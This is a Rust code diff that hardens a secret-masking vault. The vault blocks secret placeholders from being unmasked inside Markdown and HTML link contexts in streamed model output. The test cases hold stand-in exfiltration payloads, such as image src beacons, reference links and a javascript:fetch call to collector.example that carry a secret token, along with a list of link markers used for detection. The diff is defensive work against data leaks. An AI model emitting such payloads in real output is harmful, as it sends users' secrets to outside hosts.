@@ -200,7 +200,7 @@ static UUID: LazyLock<Regex> = LazyLock::new(|| {
         .expect("valid regex")
 });
 static URL_CREDENTIALS: LazyLock<Regex> =
-    LazyLock::new(|| Regex::new(r"://([^/\s:@]{1,64}):([^/\s@]{1,128})@").expect("valid regex"));
+    LazyLock::new(|| Regex::new(r"://([^/\s:@]{0,64}):([^/\s@]{1,128})@").expect("valid regex"));
 static JWT: LazyLock<Regex> = LazyLock::new(|| {
     Regex::new(r"\beyJ[A-Za-z0-9_-]{5,}\.eyJ[A-Za-z0-9_-]{5,}(?:\.[A-Za-z0-9_-]*)?")
         .expect("valid regex")
@@ -934,6 +934,23 @@ impl Vault {
                  )",
                 params![MAX_NON_EXPOSED_ROWS],
             );
+            let mut counter_stmt = guard.conn().prepare("SELECT kind, token FROM vault")?;
+            let counter_rows = counter_stmt.query_map([], |row| {
+                Ok((row.get::<_, String>(0)?, row.get::<_, String>(1)?))
+            })?;
+            for row in counter_rows {
+                let (kind, token) = row?;
+                let Some(kind) = Kind::parse(&kind) else {
+                    continue;
+                };
+                if let Some(index) = TOKEN
+                    .captures(&token)
+                    .and_then(|c| c[2].parse::<u32>().ok())
+                {
+                    let counter = vault.counters.entry(kind).or_default();
+                    *counter = (*counter).max(index);
+                }
+            }
             let mut statement = guard.conn().prepare(
                 "SELECT token, kind, value, first_seen_utc FROM vault
                  ORDER BY exposed DESC, first_seen_utc DESC, token DESC LIMIT 12000",
@@ -1213,7 +1230,7 @@ impl Vault {
         let group =
             |regex: &Regex, index: usize, kind: Kind, spans: &mut Vec<(usize, usize, Kind)>| {
                 for found in regex.captures_iter(text) {
-                    if let Some(part) = found.get(index) {
+                    if let Some(part) = found.get(index).filter(|m| !m.as_str().is_empty()) {
                         spans.push((part.start(), part.end(), kind));
                     }
                 }
@@ -1534,11 +1551,15 @@ impl Vault {
             in_external_word: false,
             word_tail: String::new(),
             md_link_parens: 0,
+            in_md_image_alt: false,
+            md_link_is_image: false,
             in_html_tag: false,
             html_quote: None,
+            html_tag_newlines: 0,
             at_line_start: true,
             in_ref_label: false,
             in_ref_def: false,
+            ref_def_needs_dest: false,
         }
     }
 }
@@ -1565,9 +1586,31 @@ const LINK_MARKERS: &[&str] = &[
     "src=",
     "href=",
     "srcset=",
+    "action=",
     "formaction=",
+    "poster=",
+    "background=",
+    "ping=",
     "url(",
+    "&#",
+    "&colon",
+    "&sol",
+    "%2f",
+    "%3a",
 ];
+
+fn is_line_prefix_marker(word: &str) -> bool {
+    if word.is_empty() {
+        return false;
+    }
+    if word.bytes().all(|b| b == b'>') || matches!(word, "-" | "*" | "+") {
+        return true;
+    }
+    let digits = word.trim_end_matches(['.', ')']);
+    digits.len() + 1 == word.len()
+        && !digits.is_empty()
+        && digits.bytes().all(|b| b.is_ascii_digit())
+}
 
 /// Unmasks streamed text, a whole word at a time: whether a placeholder is
 /// filled in depends on the rest of its word and surrounding Markdown/HTML
@@ -1586,23 +1629,50 @@ pub struct StreamUnmasker {
     in_external_word: bool,
     word_tail: String,
     md_link_parens: usize,
+    in_md_image_alt: bool,
+    md_link_is_image: bool,
     in_html_tag: bool,
     html_quote: Option<u8>,
+    html_tag_newlines: usize,
     at_line_start: bool,
     in_ref_label: bool,
     in_ref_def: bool,
+    ref_def_needs_dest: bool,
 }
 
 impl StreamUnmasker {
-    fn fill(&self, text: &str) -> String {
+    fn fill(&self, text: &str, allow_secrets: bool) -> String {
         TOKEN
             .replace_all(text, |found: &regex::Captures| {
-                match self.values.get(&found[0]) {
+                let tok = &found[0];
+                if !allow_secrets && tok.starts_with("<<SEC_") {
+                    return tok.to_owned();
+                }
+                match self.values.get(tok) {
                     Some(value) => value.clone(),
-                    None => found[0].to_owned(),
+                    None => tok.to_owned(),
                 }
             })
             .into_owned()
+    }
+
+    /// Flushes any buffered word fragment and resets Markdown/HTML link parser
+    /// state between independent model attempts (e.g. after a declined stream).
+    pub fn flush_and_reset(&mut self) -> String {
+        let rest = self.finish();
+        self.in_external_word = false;
+        self.word_tail.clear();
+        self.md_link_parens = 0;
+        self.in_md_image_alt = false;
+        self.md_link_is_image = false;
+        self.in_html_tag = false;
+        self.html_quote = None;
+        self.html_tag_newlines = 0;
+        self.at_line_start = true;
+        self.in_ref_label = false;
+        self.in_ref_def = false;
+        self.ref_def_needs_dest = false;
+        rest
     }
 
     /// Whether `word` is a standalone `http(s)://` link to a `HOST` or `DOM`
@@ -1688,13 +1758,28 @@ impl StreamUnmasker {
         if core.is_empty() {
             self.in_external_word = false;
             self.word_tail.clear();
-            if trailing_ws.contains('\n') {
-                if self.at_line_start {
+            let newlines = trailing_ws.matches('\n').count();
+            if newlines > 0 {
+                if self.at_line_start || newlines >= 2 {
                     self.md_link_parens = 0;
-                    self.in_html_tag = false;
-                    self.html_quote = None;
+                    self.in_md_image_alt = false;
+                    self.md_link_is_image = false;
+                    self.in_ref_def = false;
+                    self.ref_def_needs_dest = false;
+                } else if self.ref_def_needs_dest && newlines == 1 {
+                    self.ref_def_needs_dest = false;
+                } else {
+                    self.in_ref_def = false;
+                    self.ref_def_needs_dest = false;
                 }
-                self.in_ref_def = false;
+                if self.in_html_tag {
+                    self.html_tag_newlines += newlines;
+                    if self.html_tag_newlines > 8 {
+                        self.in_html_tag = false;
+                        self.html_quote = None;
+                        self.html_tag_newlines = 0;
+                    }
+                }
                 self.in_ref_label = false;
                 self.at_line_start = true;
             }
@@ -1704,19 +1789,27 @@ impl StreamUnmasker {
         let stripped = TOKEN.replace_all(core, "T");
 
         if self.word_tail.is_empty() {
-            if self.at_line_start {
-                if stripped.starts_with('[') && !stripped.starts_with("![") {
-                    if stripped.ends_with("]:") {
-                        self.in_ref_def = true;
-                    } else if !stripped.contains(']') {
-                        self.in_ref_label = true;
+            if self.in_ref_def {
+                self.ref_def_needs_dest = false;
+            } else if self.at_line_start {
+                if is_line_prefix_marker(&stripped) {
+                    // Keep `at_line_start = true` after `>`, `-`, `*`, `+`, `1.`, `1)`
+                } else {
+                    if stripped.starts_with('[') && !stripped.starts_with("![") {
+                        if stripped.ends_with("]:") {
+                            self.in_ref_def = true;
+                            self.ref_def_needs_dest = true;
+                        } else if !stripped.contains(']') {
+                            self.in_ref_label = true;
+                        }
                     }
+                    self.at_line_start = false;
                 }
-                self.at_line_start = false;
             } else if self.in_ref_label {
                 if stripped.ends_with("]:") {
                     self.in_ref_label = false;
                     self.in_ref_def = true;
+                    self.ref_def_needs_dest = true;
                 } else if stripped.contains(']') {
                     self.in_ref_label = false;
                 }
@@ -1725,6 +1818,7 @@ impl StreamUnmasker {
         let word_in_ref = self.in_ref_def;
 
         let mut word_in_md_dest = self.md_link_parens > 0;
+        let mut word_in_md_image = self.md_link_parens > 0 && self.md_link_is_image;
         let sbytes = stripped.as_bytes();
         let mut idx = 0;
         while idx < sbytes.len() {
@@ -1737,12 +1831,26 @@ impl StreamUnmasker {
                     self.md_link_parens += 1;
                 } else if sbytes[idx] == b')' {
                     self.md_link_parens -= 1;
+                    if self.md_link_parens == 0 {
+                        self.md_link_is_image = false;
+                    }
                 }
-            } else if idx + 1 < sbytes.len() && sbytes[idx] == b']' && sbytes[idx + 1] == b'(' {
-                self.md_link_parens = 1;
-                word_in_md_dest = true;
+            } else if idx + 1 < sbytes.len() && sbytes[idx] == b'!' && sbytes[idx + 1] == b'[' {
+                self.in_md_image_alt = true;
                 idx += 2;
                 continue;
+            } else if idx + 1 < sbytes.len() && sbytes[idx] == b']' && sbytes[idx + 1] == b'(' {
+                self.md_link_parens = 1;
+                self.md_link_is_image = self.in_md_image_alt;
+                self.in_md_image_alt = false;
+                word_in_md_dest = true;
+                if self.md_link_is_image {
+                    word_in_md_image = true;
+                }
+                idx += 2;
+                continue;
+            } else if sbytes[idx] == b']' {
+                self.in_md_image_alt = false;
             }
             idx += 1;
         }
@@ -1761,6 +1869,7 @@ impl StreamUnmasker {
                     self.html_quote = Some(b);
                 } else if b == b'>' {
                     self.in_html_tag = false;
+                    self.html_tag_newlines = 0;
                 }
             } else if b == b'<'
                 && sbytes
@@ -1768,6 +1877,7 @@ impl StreamUnmasker {
                     .is_some_and(|next| next.is_ascii_alphabetic())
             {
                 self.in_html_tag = true;
+                self.html_tag_newlines = 0;
                 word_in_html = true;
             }
             j += 1;
@@ -1780,23 +1890,41 @@ impl StreamUnmasker {
             std::borrow::Cow::Owned(format!("{}{lower}", self.word_tail))
         };
         let in_link = LINK_MARKERS.iter().any(|mark| combined.contains(mark));
-        let allow_own_host =
-            self.word_tail.is_empty() && !was_in_html_tag && self.links_to_own_host(core);
-        let blocked = self.in_external_word
-            || ((in_link || word_in_md_dest || word_in_ref || word_in_html) && !allow_own_host);
+        let in_any_link_ctx = in_link || word_in_md_dest || word_in_ref || word_in_html;
+        let allow_own_host = self.word_tail.is_empty()
+            && !was_in_html_tag
+            && !word_in_ref
+            && !word_in_md_image
+            && self.links_to_own_host(core);
+        let blocked = self.in_external_word || (in_any_link_ctx && !allow_own_host);
 
         if ends_ws {
             self.in_external_word = false;
             self.word_tail.clear();
-            if trailing_ws.contains('\n') {
-                self.in_ref_def = false;
+            let newlines = trailing_ws.matches('\n').count();
+            if newlines > 0 {
+                if newlines >= 2 {
+                    self.md_link_parens = 0;
+                    self.in_md_image_alt = false;
+                    self.md_link_is_image = false;
+                    self.in_ref_def = false;
+                    self.ref_def_needs_dest = false;
+                } else if self.ref_def_needs_dest && newlines == 1 {
+                    self.ref_def_needs_dest = false;
+                } else {
+                    self.in_ref_def = false;
+                    self.ref_def_needs_dest = false;
+                }
+                if self.in_html_tag {
+                    self.html_tag_newlines += newlines;
+                    if self.html_tag_newlines > 8 {
+                        self.in_html_tag = false;
+                        self.html_quote = None;
+                        self.html_tag_newlines = 0;
+                    }
+                }
                 self.in_ref_label = false;
                 self.at_line_start = true;
-                if trailing_ws.matches('\n').count() >= 2 {
-                    self.md_link_parens = 0;
-                    self.in_html_tag = false;
-                    self.html_quote = None;
-                }
             }
         } else {
             if blocked {
@@ -1813,7 +1941,7 @@ impl StreamUnmasker {
         if !core.contains("<<") || blocked {
             word.to_owned()
         } else {
-            format!("{}{trailing_ws}", self.fill(core))
+            format!("{}{trailing_ws}", self.fill(core, !in_any_link_ctx))
         }
     }
 
@@ -2603,6 +2731,11 @@ mod tests {
         vault.register(Kind::Path, "/home/auditor/loot/id_rsa");
         let request = "<<HOST_01>> <<DOM_01>> <<SEC_01>> <<PATH_01>>";
 
+        assert_eq!(
+            vault.mask_text("redis://:Winter2026!x@10.0.0.5:6379/0"),
+            "redis://:<<SEC_01>>@<<HOST_01>>:6379/0"
+        );
+
         let run_both = |reply: &str| {
             let mut stream = vault.stream_for(request);
             let mut whole = stream.push(reply);
@@ -2638,9 +2771,16 @@ mod tests {
             "[x]( <https://collector.example/path with space/<<SEC_01>>> )",
             "[ref]: /collector/<<SEC_01>>",
             "[two words]: https://collector.example/<<SEC_01>>",
+            "> [ref]: https://collector.example/<<SEC_01>>",
+            "- [ref]: https://collector.example/<<SEC_01>>",
+            "1. [ref]: https://collector.example/<<SEC_01>>",
+            "[ref]:\n  /collector/<<SEC_01>>",
+            "![two words]( https://<<HOST_01>>/admin?s=<<SEC_01>> )",
+            "<img\n\nsrc=\"https://collector.example/<<SEC_01>>\">",
             "<img src = \"https://collector.example/p.png\" alt=\"<<SEC_01>>\">",
             "<img alt=\"1 > 0\" src=\"https://collector.example/<<SEC_01>>\">",
             "<a href=\"javascript:fetch('//collector.example/<<SEC_01>>')\">x</a>",
+            "https%3a%2f%2fcollector.example/<<SEC_01>>",
             oversized_external.as_str(),
             split_marker_external.as_str(),
         ] {
@@ -2649,6 +2789,12 @@ mod tests {
             assert!(!out.contains("Winter2026!x"));
             assert!(!out.contains("10.0.0.5"));
         }
+
+        // Own-host links unmask HOST/DOM/PATH, but never SEC tokens inside URLs.
+        assert_eq!(
+            run_both("Open https://<<HOST_01>>/admin?token=<<SEC_01>> now."),
+            "Open https://10.0.0.5/admin?token=<<SEC_01>> now."
+        );
 
         // Mid-line `[1]:` prose, own-host Markdown links, and prose after closed tags still unmask.
         assert_eq!(
